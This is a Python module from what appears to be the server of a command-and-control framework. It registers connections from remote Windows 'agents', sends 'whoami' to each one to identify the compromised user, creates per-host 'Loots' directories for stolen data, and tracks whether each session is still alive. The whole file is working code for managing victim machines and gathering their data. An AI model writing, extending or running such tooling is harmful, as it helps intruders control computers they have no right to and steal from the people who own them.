from .database import AgentsDB
from .session_manager import SessionManager
from .common import *
from .logging import AutoComplete
import socket, threading, time, os




def save_agent(conn, external_ip):

    hostname = ""
    agents_db = AgentsDB()

    session_id = SessionManager.createSessionId()
    SessionManager.agents_connections[session_id] = conn

    try:
        
        conn.send("whoami".encode('utf-8'))
        response = conn.recv(4096).decode('utf-8')
        
        user_parts = response.split('\n')[0].split('\\')
        hostname = user_parts[0].upper()
        username = user_parts[1].strip('\r')
        
        user = f"{hostname}/{username}"

    except ConnectionError:

        user = "Unknown"
        print(f"\n{c.alt} An error occurred while trying to get user from agent {external_ip}")
        
    AutoComplete.defaultCommands.append(session_id)
    
    loot_path = f"Loots/{hostname}"

    try:
            
        if not os.path.exists(loot_path):
            os.makedirs(loot_path)
            
        SessionManager.loots_paths[session_id] = loot_path
                    
    except OSError:
        
        print(f"{c.alt} An error occurred while trying to create loot directory")
        
    
    agents_db.add_agent(session_id, external_ip, "Windows", user, "Active")
    threading.Thread(target=is_agent_alive, name="is_agent_alive_thread").start()


    
def is_agent_alive():

    agents_db = AgentsDB()
    
    while True:
        time.sleep(1)
        
        for session_id, conn in SessionManager.agents_connections.items():
            try:
                error = conn.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
                
                if error != 0:
                    agents_db.update_agent_status(session_id, "Inactive")
                    user = agents_db.get_agent_user(session_id)
                    print(f"\n\n{c.alt} Connection with Agent {c.RS}{c.O}{user}{c.RS} lost")
                    pass
                
            except socket.timeout:
                pass
            
            except ConnectionError:
                agents_db.update_agent_status(session_id, "Inactive")

        